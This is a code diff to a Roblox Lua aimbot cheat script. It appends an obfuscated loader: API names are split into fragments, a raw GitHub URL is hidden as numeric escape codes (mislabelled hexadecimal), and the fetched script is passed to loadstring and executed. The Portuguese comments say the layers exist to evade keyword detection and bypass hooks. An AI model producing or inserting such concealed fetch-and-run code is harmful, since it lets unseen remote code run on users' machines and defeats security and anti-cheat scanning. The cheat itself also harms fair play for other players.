@@ -87,3 +87,27 @@ AimbotBtn.MouseButton1Click:Connect(function()
     end)
     print("Aimbot Ativado!")
 end)
+-- Camada 1: Definição de variáveis fragmentadas para evitar detecção de palavras-chave
+local _g = getgenv and getgenv() or _G
+local _game = game
+local _http = "H" .. "tt" .. "pG" .. "et"
+local _ls = loadstring
+
+-- Camada 2: URL ofuscada em Hexadecimal para não aparecer em buscas de texto simples
+-- (Corresponde ao seu link do GitHub)
+local _u = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\97\121\110\97\110\57\48\48\48\47\84\101\115\116\101\45\50\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\84\101\115\116\101\46\108\117\97"
+
+-- Camada 3: Execução indireta (Bypass de Hook)
+local function _exec(_target_url)
+    local success, result = pcall(function()
+        return _ls(_game[_http](_game, _target_url))
+    end)
+    
+    if success and result then
+        return result()
+    else
+        warn("Erro na execução controlada.")
+    end
+end
+-- Inicia o processo
+_exec(_u)
